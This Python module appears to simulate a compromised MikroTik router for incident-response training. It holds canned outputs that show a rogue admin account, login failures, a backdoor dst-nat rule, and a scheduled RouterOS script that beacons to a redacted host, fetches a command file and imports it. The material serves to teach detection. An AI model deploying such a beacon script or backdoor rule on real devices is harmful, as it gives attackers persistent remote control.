"""MikroTik RouterOS 7.10 device data + grammar for mkt-rb750.

Backdrop: CVE-2018-14847 (Winbox auth-bypass-to-arbitrary-file-read)
remains in the wild on un-patched edge MikroTiks. Once creds are
recovered, the attacker logs in and persists via
`/system scheduler` — VPNFilter-style. The on-box symptoms are
scheduled scripts that nobody on the team wrote, plus a
`dst-nat` rule that pivots an internal port to the world.
"""

from __future__ import annotations

import sys

HOSTNAME = "mkt-rb750"

BANNER = """
  MMM      MMM       KKK                          TTTTTTTTTTT      KKK
  MMMM    MMMM       KKK                          TTTTTTTTTTT      KKK
  MMM MMMM MMM  III  KKK  KKK  RRRRRR     OOOOOO      TTT     III  KKK  KKK
  MMM  MM  MMM  III  KKKKK     RRR  RRR  OOO  OOO     TTT     III  KKKKK
  MMM      MMM  III  KKK KKK   RRRRRR    OOO  OOO     TTT     III  KKK KKK
  MMM      MMM  III  KKK  KKK  RRR  RRR   OOOOOO      TTT     III  KKK  KKK

  MikroTik RouterOS 7.10.1 (c) 1999-2024       https://www.mikrotik.com/

"""

AUTH_BANNER = ""
AUTH_USERNAME_PROMPT = "Login: "
AUTH_PASSWORD_PROMPT = "Password: "

PROMPT_SUFFIXES = {"user": " > "}


def PROMPT_FORMAT(host, mode, suffix):
    return f"[admin@{host}]{suffix}"


SYSTEM_IDENTITY = """name: mkt-rb750
"""

SYSTEM_RESOURCE = """               uptime: 142d4h11m32s
              version: 7.10.1 (stable)
           build-time: 2024-03-15 09:21:44
     factory-software: 6.42.1
             free-hdd: 5.8 MiB
             total-hdd: 8.0 MiB
     write-sect-since-reboot: 14422
        write-sect-total: 8412091
     architecture-name: mipsbe
            board-name: RB750Gr3
              platform: MikroTik
"""

USER_PRINT = """ # NAME              GROUP   ADDRESS                         LAST-LOGGED-IN
 0 admin              full    0.0.0.0/0                        2026-05-15 03:14:22
 1 nms-readonly       read    10.10.0.0/24                     2026-05-14 22:00:11
 2 REDACTED            full    0.0.0.0/0                        2026-05-15 03:11:08
"""

SYSTEM_SCHEDULER_PRINT = """Flags: X - disabled
 #   NAME              START-DATE    START-TIME   INTERVAL   ON-EVENT
 0   nightly-conf-bkp  2024-01-01    02:00:00     1d         /system backup save name=corp-bkp
 1   ssh-keep-alive    2024-01-01    00:00:00     5m         /ip ssh print
 2   tmp-cleanup       2024-01-01    03:30:00     1d         /file remove [/file find name~"\\\\.tmp\$"]
 3   REDACTED   2026-05-15    03:14:22     1h         REDACTED
"""

SYSTEM_SCRIPT_PRINT = """Flags: I - invalid
 0 name="REDACTED" owner=REDACTED policy=read,write,policy,test,password,sniff
   last-started=2026-05-15 03:14:22 run-count=12 source=
       :local out [/system identity get name];
       :local fwd "http://REDACTED/ping?h=$out";
       :do { /tool fetch url=$fwd mode=http keep-result=no } on-error={ /log info "fetch fail" };
       :do { /tool fetch url="http://REDACTED/cmd?h=$out" dst-path=/etc/tmp.rsc } on-error={};
       :do { /import /etc/tmp.rsc } on-error={};
"""

IP_FIREWALL_NAT_PRINT = """Flags: X - disabled, I - invalid, D - dynamic
 0   ;;; masquerade out wan
     chain=srcnat action=masquerade out-interface=ether1
 1   ;;; mgmt dnat for office vpn
     chain=dstnat action=dst-nat to-addresses=10.10.0.50 to-ports=22 protocol=tcp dst-address=192.0.2.18 dst-port=2222
 2   ;;; REDACTED
     chain=dstnat action=dst-nat to-addresses=REDACTED to-ports=22 protocol=tcp in-interface=ether1 dst-port=REDACTED
"""

IP_FIREWALL_FILTER_PRINT = """Flags: X - disabled, I - invalid, D - dynamic
 0   chain=input action=accept connection-state=established,related
 1   chain=input action=accept in-interface=ether2 src-address=10.10.0.0/24
 2   chain=input action=drop in-interface=ether1 log=yes log-prefix=wan-drop
"""

LOG_PRINT = """2026-05-15 03:08:11 system,error login failure for user admin from REDACTED via winbox
2026-05-15 03:08:14 system,error login failure for user admin from REDACTED via winbox
2026-05-15 03:09:48 system,info,account user admin logged in from REDACTED via winbox
2026-05-15 03:11:08 system,info,account user REDACTED added by admin
2026-05-15 03:14:22 system,info added scheduler "REDACTED"
2026-05-15 03:14:22 system,info added ip firewall nat rule "REDACTED"
"""


def _identity(s, a): return SYSTEM_IDENTITY
def _resource(s, a): return SYSTEM_RESOURCE
def _user(s, a): return USER_PRINT
def _scheduler(s, a): return SYSTEM_SCHEDULER_PRINT
def _script(s, a): return SYSTEM_SCRIPT_PRINT
def _nat(s, a): return IP_FIREWALL_NAT_PRINT
def _filter(s, a): return IP_FIREWALL_FILTER_PRINT
def _log(s, a): return LOG_PRINT


def _exit(s, a):
    print()
    raise SystemExit


GRAMMAR = {
    "/system": {
        "identity": {"print": {"fn": _identity}},
        "resource": {"print": {"fn": _resource}},
        "scheduler": {"print": {"fn": _scheduler}},
        "script": {"print": {"fn": _script}},
    },
    "/user": {"print": {"fn": _user}},
    "/ip": {
        "firewall": {
            "nat": {"print": {"fn": _nat}},
            "filter": {"print": {"fn": _filter}},
        },
    },
    "/log": {"print": {"fn": _log}},
    "quit": {"fn": _exit},
    "exit": {"fn": _exit},
    "logout": {"fn": _exit},
}
